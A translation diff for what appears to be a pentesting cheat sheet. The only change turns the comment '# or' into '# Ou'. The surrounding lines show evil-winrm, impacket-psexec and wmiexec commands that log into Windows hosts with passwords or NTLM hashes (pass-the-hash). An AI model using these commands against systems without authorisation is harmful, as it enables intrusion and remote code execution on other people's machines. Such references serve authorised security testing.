@@ -40,7 +40,7 @@ evil-winrm -u <username> -p <password> -i <target_ip>
 ```bash
 # Utilisez l'option -S pour ignorer la validation SSL pour les systèmes non sécurisés.
 evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
-# or
+# Ou
 evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
 
 ```
@@ -76,7 +76,7 @@ impacket-psexec <username>:<password>@<target_ip>
 
 ```bash
 impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
-# or
+# Ou
 impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>
 
 ```
@@ -92,7 +92,7 @@ impacket-wmiexec <username>:<password>@<target_ip>
 
 ```bash
 impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
-# or
+# Ou
 impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
 
 ```
@@ -133,7 +133,7 @@ Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ip
 
 ```bash
 wmiexec.py <domain>/<username>:<password>@<target_ip>
-# or
+# Ou
 wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
 
 ```
